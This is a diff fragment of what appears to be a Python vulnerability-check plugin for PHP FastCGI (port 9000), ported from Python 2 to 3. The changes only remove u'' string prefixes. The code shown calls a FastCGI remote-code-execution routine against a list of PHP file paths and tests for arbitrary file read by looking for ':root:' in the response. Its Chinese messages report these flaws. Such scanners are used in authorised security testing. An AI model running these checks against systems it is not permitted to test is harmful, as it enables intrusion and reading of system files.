@@ -114,14 +114,14 @@ def exploit(host, port):
     for filepath in phpfile_list:
         res = fast_cgi_rce(host, port, php_filepath=filepath)
         if res:
-            return (True, u'存在任意代码执行漏洞,php文件路径：' + filepath)
+            return (True, '存在任意代码执行漏洞,php文件路径：' + filepath)
     return False
 
 def verify(host, port):
     info = ''
     res = send_socket(host, port, timeout=5, waittime=0, payload=poc_payload)
     if ':root:' in res:
-        info = u'存在fastcgi任意文件读取漏洞'
+        info = '存在fastcgi任意文件读取漏洞'
         return (True, info)
     return False
 
@@ -133,11 +133,11 @@ def check(host, port, timeout):
             info += ret[1]
         ret = exploit(host, port)
         if ret:
-            info = info+u';' if info else info
+            info = info+';' if info else info
             info += ret[1]
             return info
     except Exception as e:
         pass
 
 if __name__ == '__main__':
-    print(check('127.0.0.1', 9000, timeout=10))
+    print((check('127.0.0.1', 9000, timeout=10)))
